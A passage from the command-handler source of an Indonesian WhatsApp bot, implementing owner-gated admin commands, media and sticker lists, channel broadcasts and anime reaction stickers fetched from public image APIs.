      body: `Profile Information`,
      thumbnailUrl: url,
      sourceUrl: global.saluran,
      mediaType: 1,
      renderLargerThumbnail: true
    }
  }
}, { quoted: m });
}
break;
case 'cekprem':
case 'cekpremium': {
  const prem = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/premium.json'))
  const now = Date.now()
  const userPremium = prem.find(user => user.id === m.sender)

  if (!userPremium || userPremium.expired <= now) {
    return replyReinzID(`🚫 Kamu *bukan user premium* atau masa aktifmu sudah habis.\n\nUntuk akses premium, silakan ketik *.owner* untuk menghubungi pemilik bot.`)
  }

  function msToTime(ms) {
    const days = Math.floor(ms / (24 * 60 * 60 * 1000))
    const daysms = ms % (24 * 60 * 60 * 1000)
    const hours = Math.floor(daysms / (60 * 60 * 1000))
    const hoursms = ms % (60 * 60 * 1000)
    const minutes = Math.floor(hoursms / (60 * 1000))
    return `${days} hari ${hours} jam ${minutes} menit`
  }

  const sisaWaktu = msToTime(userPremium.expired - now)
  const namaUser = m.pushName || m.sender.split("@")[0]

  const teks = `✨ Premium Info ✨\n\n` +
               `👤 User: ${namaUser}\n` +
               `⏳ Sisa Waktu: *${sisaWaktu}*`

  return replyReinzID(teks, {
    mentions: [m.sender]
  })
}
break;
case 'addbadword':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Whats the word?')
if (isToxic.includes(q)) return replyReinzID("The word is already in use")
isToxic.push(q)
fs.writeFileSync('./node_modules/Arisu-MD/database/bad.json', JSON.stringify(isToxic))
replyReinzID(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Enter the word')
if (!isToxic.includes(q)) return replyReinzID("The word does not exist in the database")
let wanu = isToxic.indexOf(q)
isToxic.splice(wanu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/bad.json', JSON.stringify(isToxic))
replyReinzID(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of isToxic) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${isToxic.length}*`
replyReinzID(teks)
}
break
case 'addvideo':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Whats the video name?')
if (VideoReinzID.includes(q)) return replyReinzID("The name is already in use")
let delb = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
VideoReinzID.push(q)
await fsx.copy(delb, `./node_modules/Arisu-MD/data/RyuuMedia/video/${q}.mp4`)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonvideo.json', JSON.stringify(VideoReinzID))
fs.unlinkSync(delb)
replyReinzID(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Enter the video name')
if (!VideoReinzID.includes(q)) return replyReinzID("The name does not exist in the database")
let wanu = VideoReinzID.indexOf(q)
VideoReinzID.splice(wanu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonvideo.json', JSON.stringify(VideoReinzID))
fs.unlinkSync(`./node_modules/Arisu-MD/data/RyuuMedia/video/${q}.mp4`)
replyReinzID(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoReinzID) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoReinzID.length}*`
replyReinzID(teks)
}
break
case 'addimage':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Whats the image name?')
if (ImageReinzID.includes(q)) return replyReinzID("The name is already in use")
let delb = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
ImageReinzID.push(q)
await fsx.copy(delb, `./node_modules/Arisu-MD/data/RyuuMedia/image/${q}.jpg`)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonimage.json', JSON.stringify(ImageReinzID))
fs.unlinkSync(delb)
replyReinzID(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Enter the image name')
if (!ImageReinzID.includes(q)) return replyReinzID("The name does not exist in the database")
let wanu = ImageReinzID.indexOf(q)
ImageReinzID.splice(wanu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonimage.json', JSON.stringify(ImageReinzID))
fs.unlinkSync(`./node_modules/Arisu-MD/data/RyuuMedia/image/${q}.jpg`)
replyReinzID(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageReinzID) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageReinzID.length}*`
replyReinzID(teks)
}
break
case 'addsticker':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Whats the sticker name?')
if (ReinzIDSticker.includes(q)) return replyReinzID("The name is already in use")
let delb = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
ReinzIDSticker.push(q)
await fsx.copy(delb, `./node_modules/Arisu-MD/data/RyuuMedia/sticker/${q}.webp`)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonsticker.json', JSON.stringify(ReinzIDSticker))
fs.unlinkSync(delb)
replyReinzID(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Enter the sticker name')
if (!ReinzIDSticker.includes(q)) return replyReinzID("The name does not exist in the database")
let wanu = ReinzIDSticker.indexOf(q)
ReinzIDSticker.splice(wanu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonsticker.json', JSON.stringify(ReinzIDSticker))
fs.unlinkSync(`./node_modules/Arisu-MD/data/RyuuMedia/sticker/${q}.webp`)
replyReinzID(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of ReinzIDSticker) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ReinzIDSticker.length}*`
replyReinzID(teks)
}
break
case 'addvn':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Whats the audio name?')
if (ReinzIDVoiceNote.includes(q)) return replyReinzID("The name is already in use")
let delb = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
ReinzIDVoiceNote.push(q)
await fsx.copy(delb, `./node_modules/Arisu-MD/data/assets/audio/${q}.mp3`)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonvn.json', JSON.stringify(ReinzIDVoiceNote))
fs.unlinkSync(delb)
replyReinzID(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replyReinzID('Enter the vn name')
if (!ReinzIDVoiceNote.includes(q)) return replyReinzID("The name does not exist in the database")
let wanu = ReinzIDVoiceNote.indexOf(q)
ReinzIDVoiceNote.splice(wanu, 1)
fs.writeFileSync('./node_modules/Arisu-MD/data/RyuuMedia/database/xeonvn.json', JSON.stringify(ReinzIDVoiceNote))
fs.unlinkSync(`./node_modules/Arisu-MD/data/assets/audio/${q}.mp3`)
replyReinzID(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of ReinzIDVoiceNote) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ReinzIDVoiceNote.length}*`
replyReinzID(teks)
}
break;
case 'antitagsw': {
  if (!isAdmins && !isRyuuTheCreator) return reply(mess.admin);
  if (!m.isGroup) return replyryuu('Fitur ini hanya untuk grup!')
  if (!isBotAdmins) return reply('_Bot harus menjadi admin terlebih dahulu untuk menggunakan fitur ini');

  const { list, add, remove, isActive } = require('./lib/antitagsw.js')
  const set = q.toLowerCase()

  if (set === 'on') {
    if (isActive(m.chat)) return replyryuu('Antitagsw sudah aktif di grup ini.')
    add(m.chat)
    replyryuu('✅ Fitur antitagsw telah diaktifkan. Bot akan otomatis hapus pesan tag grup dari status.')
  } else if (set === 'off') {
    if (!isActive(m.chat)) return replyryuu('Antitagsw belum aktif di grup ini.')
    remove(m.chat)
    replyryuu('❎ Fitur antitagsw dinonaktifkan.')
  } else {
    replyryuu(`Gunakan:\n.antitagsw on - untuk aktifkan\n.antitagsw off - untuk nonaktifkan`)
  }
}
break;
case 'zodiak':
case 'zodiac': {
  const zodiakList = [
    'Aries', 'Taurus', 'Gemini', 'Cancer',
    'Leo', 'Virgo', 'Libra', 'Scorpio',
    'Sagittarius', 'Capricorn', 'Aquarius', 'Pisces'
  ];

  const randomZodiak = zodiakList[Math.floor(Math.random() * zodiakList.length)];
  let target = m.sender;
  let mention = m.mentionedJid && m.mentionedJid[0];

  if (mention) {
    target = mention;
  }

  let name = await RyuuBotz.getName(target);
  reply(`Zodiak untuk *${name}* hari ini adalah *${randomZodiak}*`);
}
break;
case 'prefix': {
    if (!text) return reply(`Contoh penggunaan:\n${prefix}prefix on\n${prefix}prefix off`);
    
    if (text.toLowerCase() === 'on') {
        global.pref = true;
        reply(`✅ Prefix diaktifkan.\nPrefix sekarang: "${global.prefix}"`);
    } else if (text.toLowerCase() === 'off') {
        global.pref = false;
        reply(`✅ Prefix dimatikan.\nSekarang command tanpa prefix.`);
    } else {
        reply(`❌ Pilihan tidak valid.\nGunakan:\n${prefix}prefix on\n${prefix}prefix off`);
    }
}
break;
case 'addowner': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!args[0]) return replyReinzID(`Gunakan format:\n${prefix + command} nomor\nContoh: ${prefix + command} ${ownernumber}`);

  const bnnd = q.split("|")[0].replace(/[^0-9]/g, "");

  if (owner.includes(bnnd)) return replyReinzID("Nomor tersebut sudah menjadi owner.");

  owner.push(bnnd);
  fs.writeFileSync("./node_modules/Arisu-MD/database/owner.json", JSON.stringify(owner, null, 2));
  replyReinzID(`Nomor ${bnnd} berhasil ditambahkan sebagai *Owner*!`);
}
break;
case 'addmoney': {
  if (!isRyuuTheCreator) return replyReinzID(mess.owner)

  const userMention = m.mentionedJid[0]
  const amount = parseInt(args[1])

  if (!userMention) return replyReinzID(`Tag salah satu user!\n\nContoh: .addmoney @user 999`)
  if (!amount || isNaN(amount)) return replyReinzID(`Masukkan jumlah uang yang valid!\n\nContoh: .addmoney @user 999`)

  let user = global.db.users[userMention]
  if (!user) return replyReinzID(`User tidak ditemukan dalam database!`)

  user.money += amount

  replyReinzID(`Berhasil menambahkan +${amount.toLocaleString('id-ID')} Money ke @${userMention.split('@')[0]}`, m)
}
break;
case "listowner":
case "listown":
  {
    const fs = require("fs");
    let owner = JSON.parse(fs.readFileSync("./node_modules/Arisu-MD/database/owner.json"));

    let teks = "*Para owner bot ini:*\n\n";
    for (let nomor of owner) {
      teks += `- @${nomor}\n`;
    }
    teks += `\n*Total : ${owner.length}*`;

    await RyuuBotz.sendMessage(m.chat, {
      text: teks.trim(),
      mentions: owner.map(n => n + "@s.whatsapp.net")
    }, {
      quoted: m
    });
  }
  break;
  case 'addpartner': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!args[0]) return replyReinzID(`Gunakan format:\n${prefix + command} nomor\nContoh: ${prefix + command} 6281234567890`);

  const bnnd = q.split("|")[0].replace(/[^0-9]/g, "");

  if (fs.existsSync("./node_modules/Arisu-MD/database/partner.json") === false) fs.writeFileSync("./node_modules/Arisu-MD/database/partner.json", JSON.stringify([]));
  let partner = JSON.parse(fs.readFileSync("./node_modules/Arisu-MD/database/partner.json"));

  if (partner.includes(bnnd)) return replyReinzID("Nomor tersebut sudah menjadi partner.");

  partner.push(bnnd);
  fs.writeFileSync("./node_modules/Arisu-MD/database/partner.json", JSON.stringify(partner, null, 2));
  replyReinzID(`Nomor ${bnnd} berhasil ditambahkan sebagai *Partner*!`);
}
break;
case 'delpartner': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!args[0]) return replyReinzID(`Gunakan format:\n${prefix + command} nomor\nContoh: ${prefix + command} 6281234567890`);

  const ya = q.split("|")[0].replace(/[^0-9]/g, "");
  let partner = JSON.parse(fs.readFileSync("./node_modules/Arisu-MD/database/partner.json"));

  const index = partner.indexOf(ya);
  if (index === -1) return replyReinzID("Nomor tersebut tidak ditemukan di daftar partner.");

  partner.splice(index, 1);
  fs.writeFileSync("./node_modules/Arisu-MD/database/partner.json", JSON.stringify(partner, null, 2));
  replyReinzID(`Nomor ${ya} berhasil dihapus dari daftar *Partner*!`);
}
break;
case 'listpartner': case 'listpart': {
  if (fs.existsSync("./node_modules/Arisu-MD/database/partner.json") === false) fs.writeFileSync("./node_modules/Arisu-MD/database/partner.json", JSON.stringify([]));
  let partner = JSON.parse(fs.readFileSync("./node_modules/Arisu-MD/database/partner.json"));

  let teks = "*Daftar Partner bot:*\n\n";
  for (let nomor of partner) {
    teks += `- @${nomor}\n`;
  }
  teks += `\n*Total : ${partner.length}*`;

  await RyuuBotz.sendMessage(m.chat, {
    text: teks.trim(),
    mentions: partner.map(n => n + "@s.whatsapp.net")
  }, {
    quoted: m
  });
}
break;
  case 'reactch2': 
  case 'rch2': {
  if (!text && !m.quoted) return reply(`Contoh:\n${prefix + command} https://whatsapp.com/channel/ID/KODE Pesan\nAtau reply pesan channel.`);

  const xStr = 'abcdefghijklmnopqrstuvwxyz1234567890 ?!';
  const yStr = {
    1: [
      '🅐', '🅑', '🅒', '🅓', '🅔', '🅕', '🅖', '🅗', '🅘', '🅙',
      '🅚', '🅛', '🅜', '🅝', '🅞', '🅟', '🅠', '🅡', '🅢', '🅣',
      '🅤', '🅥', '🅦', '🅧', '🅨', '🅩', '1', '2', '3', '4',
      '5', '6', '7', '8', '9', '0', '➖', '❓', '❗'
    ]
  };

  const style = async (text, style = 1) => {
    const replacer = xStr.split('').map((v, i) => ({
      original: v,
      convert: yStr[style][i]
    }));
    return text.toLowerCase().split('').map(v => {
      const find = replacer.find(x => x.original === v);
      return find ? find.convert : v;
    }).join('');
  };

  let link, message;
  if (m.quoted && m.quoted.externalAdReply?.sourceUrl?.includes("whatsapp.com/channel")) {
    link = m.quoted.externalAdReply.sourceUrl;
    message = text.trim();
  } else if (text?.includes("whatsapp.com/channel/")) {
    const args = text.trim().split(" ");
    link = args[0];
    message = args.slice(1).join(" ");
  } else {
    return reply(`Gagal deteksi link!\nContoh:\n${prefix + command} https://whatsapp.com/channel/ID/KODE Pesan\nAtau reply pesan channel.`);
  }

  if (!link || !message) return reply("Pastikan link dan pesan terisi!");

  const result = link.split('https://whatsapp.com/channel/')[1];
  if (!result) return reply("Link tidak valid!");

  const [id, code] = result.split("/");
  if (!id || !code) return reply("Format link tidak lengkap!");

  const emoji = await style(message);
  try {
    const meta = await RyuuBotz.newsletterMetadata("invite", id);
    await RyuuBotz.newsletterReactMessage(meta.id, code, emoji);
    reply(`Reaksi berhasil dikirim ke *${meta.name}* dengan emoji:\n${emoji}`);
  } catch (err) {
    reply(`Gagal mengirim reaksi: ${err.message}`);
  }
}
break;
case 'msgch': {
  if (!isRyuuTheCreator) return reply(mess.owner); //Khusus owner
  if (!text) return reply(`Contoh: *${prefix + command} Halo semua channel!*`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  const who = m.sender;
  const username = await RyuuBotz.getName(who);
  let url;

  try {
    ppuser = await RyuuBotz.profilePictureUrl(who, 'image');
  } catch (e) {
    ppuser = 'https://files.catbox.moe/f61syu.jpg'; // fallback
  }

  const idch = '120363419382206255@newsletter'; // ganti dengan ID saluran kamu

  try {
    await RyuuBotz.sendMessage(idch, {
      text: text.trim(),
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
        externalAdReply: {
          title: `Pesan dari ${username}`,
          body: 'Broadcast dari Owner',
          thumbnailUrl: url,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false
        }
      }
    });

    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`✅ Pesan berhasil dikirim ke saluran:\n${idch}`);

  } catch (err) {
    console.error(err);
    reply(`Gagal mengirim pesan ke channel:\n${idch}\n\nError: ${err.message}`);
  }
}
break;
case 'msgchoff': 
case 'msgch-official': {
  if (!isRyuuTheCreator) return reply(mess.owner); //Khusus owner
  if (!text) return reply(`Contoh: *${prefix + command} Halo semua channel!*`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  const who = m.sender;
  const username = await RyuuBotz.getName(who);
  let url;

  try {
    url = await RyuuBotz.profilePictureUrl(who, 'image');
  } catch (e) {
    url = 'https://files.catbox.moe/f61syu.jpg'; // fallback
  }

  const idch = '120363393200270830@newsletter'; // ganti dengan ID saluran kamu

  try {
    await RyuuBotz.sendMessage(idch, {
      text: text.trim(),
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
        externalAdReply: {
          title: `Pesan dari ${username}`,
          body: 'Broadcast dari Owner',
          thumbnailUrl: url,
          sourceUrl: '',
          mediaType: 1,
          renderLargerThumbnail: false,
          showAdAttribution: false
        }
      }
    });

    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`✅ Pesan berhasil dikirim ke saluran:\n${idch}`);

  } catch (err) {
    console.error(err);
    reply(`Gagal mengirim pesan ke channel:\n${idch}\n\nError: ${err.message}`);
  }
}
break;
case 'msgch2': {
  if (!m.quoted) return reply(`reply media (foto/video/audio) yang ingin dikirim ke saluran.\n\nContoh: *${prefix + command} Ini caption-nya!*`);

  const quoted = m.quoted;
  const mime = quoted.mimetype || '';
  const idch = '120363419382206255@newsletter'; // ID saluran kamu
  const caption = text || '';

  let url;
  const username = await RyuuBotz.getName(m.sender);
  try {
    url = await RyuuBotz.profilePictureUrl(m.sender, 'image');
  } catch {
    url = 'https://files.catbox.moe/f61syu.jpg'; // fallback
  }

  let content;
  try {
    const buffer = await quoted.download();
    
    if (/image/.test(mime)) {
      content = {
        image: buffer,
        caption,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
          externalAdReply: {
            title: `Pesan dari ${username}`,
            body: 'Media ke Channel',
            thumbnailUrl: url,
            mediaType: 1,
            showAdAttribution: false
          }
        }
      };
    } else if (/video/.test(mime)) {
      content = {
        video: buffer,
        caption,
        mimetype: mime,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
          externalAdReply: {
            title: `Pesan dari ${username}`,
            body: 'Video ke Channel',
            thumbnailUrl: url,
            mediaType: 1,
            showAdAttribution: false
          }
        }
      };
    } else if (/audio/.test(mime)) {
      content = {
        audio: buffer,
        mimetype: mime,
        ptt: true
      };
    } else {
      return reply("Jenis media tidak didukung. reply foto, video, atau audio.");
    }

    await RyuuBotz.sendMessage(idch, content);
    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`✅ Media berhasil diteruskan ke saluran:\n${idch}`);

  } catch (err) {
    console.error(err);
    reply(`Gagal meneruskan media:\n${err.message}`);
  }
}
break;
case 'msgch2-official':
case 'msgch2off': {
  if (!m.quoted) return reply(`reply media (foto/video/audio) yang ingin dikirim ke saluran.\n\nContoh: *${prefix + command} Ini caption-nya!*`);

  const quoted = m.quoted;
  const mime = quoted.mimetype || '';
  const idch = '120363393200270830@newsletter'; // ID saluran kamu
  const caption = text || '';

  let url;
  const username = await RyuuBotz.getName(m.sender);
  try {
    url = await RyuuBotz.profilePictureUrl(m.sender, 'image');
  } catch {
    url = 'https://files.catbox.moe/f61syu.jpg'; // fallback
  }

  let content;
  try {
    const buffer = await quoted.download();
    
    if (/image/.test(mime)) {
      content = {
        image: buffer,
        caption,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
          externalAdReply: {
            title: `Pesan dari ${username}`,
            body: 'Media ke Channel',
            thumbnailUrl: url,
            mediaType: 1,
            showAdAttribution: false
          }
        }
      };
    } else if (/video/.test(mime)) {
      content = {
        video: buffer,
        caption,
        mimetype: mime,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
          externalAdReply: {
            title: `Pesan dari ${username}`,
            body: 'Video ke Channel',
            thumbnailUrl: url,
            mediaType: 1,
            showAdAttribution: false
          }
        }
      };
    } else if (/audio/.test(mime)) {
      content = {
        audio: buffer,
        mimetype: mime,
        ptt: true
      };
    } else {
      return reply("Jenis media tidak didukung. reply foto, video, atau audio.");
    }

    await RyuuBotz.sendMessage(idch, content);
    await RyuuBotz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`✅ Media berhasil diteruskan ke saluran:\n${idch}`);

  } catch (err) {
    console.error(err);
    reply(`Gagal meneruskan media:\n${err.message}`);
  }
}
break;
case 'delowner':
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!args[0]) return replyReinzID(`Use ${prefix+command} nomor\nContoh ${prefix+command} 62xxxxxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./node_modules/Arisu-MD/database/owner.json', JSON.stringify(owner))
replyReinzID(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let RyuuBotz of prem) {
teks += `- ${RyuuBotz}\n`
}
teks += `\n*Total : ${prem.length}*`
RyuuBotz.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
if (!m.quoted) return replyReinzID('Reply Message!')
if (!m.quoted.fileSha256) return replyReinzID('SHA256 Hash Missing')
if (!text) return replyReinzID(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replyReinzID('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replyReinzID(`Done!`)
            }
            break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replyReinzID(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replyReinzID('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replyReinzID(`Done!`)
            }
            break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
RyuuBotz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!m.quoted) return replyReinzID('Reply Message!')
if (!m.quoted.fileSha256) return replyReinzID('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replyReinzID('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replyReinzID('Done!')
            }
            break
case 'addmsg': {
if (!m.quoted) return replyReinzID('Reply Message You Want To Save In Database')
if (!text) return replyReinzID(`Contoh : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replyReinzID(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replyReinzID(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
if (!text) return replyReinzID(`Contoh : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replyReinzID(`'${text}' not listed in the message list`)
RyuuBotz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replyReinzID(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replyReinzID(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replyReinzID(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif': {
               if (!isRyuuTheCreator) return reply(mess.only.owner)
               if (!text) return replyReinzID(`Contoh : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replyReinzID(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await RyuuBotz.fetchStatus(who)
    replyReinzID(bio.status)
  } catch {
    if (text) return replyReinzID(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await RyuuBotz.fetchStatus(who)
      replyReinzID(bio.status)
    } catch {
      return replyReinzID(`biodatanya pribadi atau Anda belum membalas pesan orang tersebut!`)
    }
  }
}
break
  case 'setppbot':
  case 'setbotpp': {
    if (!isRyuuTheCreator) return replyReinzID(mess.only.owner)
    if (!quoted) return replyReinzID(`Kirim/reply Gambar dengan caption *${prefix + command}*`)
    if (!/image/.test(mime)) return replyReinzID(`Kirim/reply Gambar dengan caption *${prefix + command}*`)
    if (/webp/.test(mime)) return replyReinzID(`Kirim/reply Gambar dengan caption *${prefix + command}*`)

    let medis = await RyuuBotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')

    try {
      if (args[0] === 'full') {
        let { img } = await generateProfilePicture(medis)
        await RyuuBotz.query({
          tag: 'iq',
          attrs: {
            to: botNumber,
            type: 'set',
            xmlns: 'w:profile:picture'
          },
          content: [
            {
              tag: 'picture',
              attrs: { type: 'image' },
              content: img
            }
          ]
        })
        replyReinzID('Berhasil mengatur foto profil bot (full)!')
      } else {
        await RyuuBotz.updateProfilePicture(botNumber, { url: medis })
        replyReinzID('Berhasil mengatur foto profil bot!')
      }
    } catch (e) {
      console.error(e)
      replyReinzID('Gagal mengatur foto profil bot!')
    } finally {
      fs.unlinkSync(medis)
    }
  }
  break
case 'creategc': case 'creategroup': {
if (!isRyuuTheCreator) return reply(mess.only.owner)
if (!args.join(" ")) return replyReinzID(`Use ${prefix+command} groupname`)
try {
let cret = await RyuuBotz.groupCreate(args.join(" "), [])
let response = await RyuuBotz.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
RyuuBotz.sendMessage(m.chat, { text:teks, mentions: await RyuuBotz.parseMention(teks)}, {quoted:m})
} catch {
reply('yah Error kak laporankan ke owner agar di perbaiki')
}
}
break
case 'lick': case 'kiss': {
if (!isPrem) return replyprem(mess.premium)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
RyuuBotz.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
RyuuBotz.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank1':
case 'meow':
case 'tickle':{
axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
RyuuBotz.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
if (!quoted) return replyReinzID('reply ke Stiker')
if (!/webp/.test(mime)) return replyReinzID(`stiker balasan dengan judul *${prefix + command}*`)
reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
